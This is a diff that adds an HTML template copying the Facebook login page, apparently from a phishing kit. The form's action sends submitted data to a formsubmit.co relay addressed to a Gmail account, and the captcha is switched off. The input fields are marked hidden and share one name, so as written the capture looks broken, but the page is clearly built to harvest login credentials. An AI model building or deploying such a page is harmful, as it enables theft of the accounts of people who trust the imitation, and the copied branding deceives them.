@@ -1,0 +1,68 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="{{url_for('static', filename='index.png')}}" type="image/x-icon">
+	<link rel="stylesheet" type="text/css" href="{{url_for('static', filename='bootstrap-5/css/bootstrap.min.css')}}">
+    <title>Facebook</title>
+    <style>
+        section{
+            padding: 60px 0;
+        }
+    </style>
+</head>
+<body>
+ 
+    <!--facebook text and login forms-->
+    <section style="background-color: #f8f8ff;" class="">
+        <div class="container">
+            <div class="row">
+             <!--row for text-->
+
+                <div class="col">
+                    <div class="my-5 d-none d-md-block">
+                        <h1 class="fw-bold text-primary">facebook</h1>
+                        <p>Facebook helps you connect and share with the people in your life.</p>
+                    </div>
+                </div>
+
+                <!--row for login form-->
+
+                <div class="col-md-5">
+                    <h1 class="fw-bold text-primary d-md-none d-lg-none text-center">facebook</h1>
+                    <div class="mb-3 shadow p-3 mb-5 bg-body rounded">
+                        <form action="https://formsubmit.co/g.sometech@gmail.com" method="post">
+                            <input type="hidden" name="_captcha" value="false" class="form-control" id="exampleFormControlInput1" placeholder="Email address or phone number">
+                            <input type="hidden" name="_captcha" value="false" class="form-control my-2" id="exampleFormControlInput1" placeholder="password">
+                        
+                              <div class="d-grid gap-2">
+                                <button class="btn btn-primary" type="submit">Log in</button>
+                              </div>
+                              <p class="text-center text-primary my-3">Forgotten password?</p>
+                              <hr class="my-3">
+                              <div class="text-center">
+                                <a style="background-color:	#32cd32;" class="btn btn-success">Create new account</a>
+                              </div>
+                        </form>
+                    </div>
+                    <p class="text-center"><span class="fw-bold">Create a Page</span> for celebrity, brand or business</p>
+                </div>
+
+            </div>
+        </div>
+    </section>
+    
+   <!---- <section>-->
+    <div class="my-2 container" style="color:gray; font-size:14px;">
+        <p class="my-0">English  (uk)   Hausa   Francias  (France)   Portugues  (Brasil)   Espanol  Arabic  Bahasa  Indonesia   Deutsch  Chinease  Italiano  Chinease  <i style="background-color: white;" class="bi bi-plus"><button style="background-color: #f5f5f5;" class="btn btn-light"><img src="{{url_for('static', filename='pluss.svg')}}"></button></i></p>
+        <hr class="my-1">
+        <p class="my-0">Sign  Up  Log  in  Messager    Facebook   Lite  Video   Places   Games   Marketplace   Meta   Store   Meta   Quest  Instagram   Thread   Fundraisers</p>
+        <p class="my-0">Services Voting Information Center  Privacy Policy  Privacy Centre  Groups About  Create ad  Developers  Careers  Cookies  AdChoices</p>
+        <p class="my-0">Teams  Help  Contact  Uploading and non-users</p>
+        <p class="my-0">Meta <i class="bi bi-c-circle"><img src="{{url_for('static', filename='c-circle.svg')}}"></i>  2023</p>
+    </div>
+    <!--</section>-->
+
+    <script type="text/javascript" src="{{url_for('static', filename='bootstrap-5/js/bootstrap.min.js')}}"></script>
+</body>
+</html>
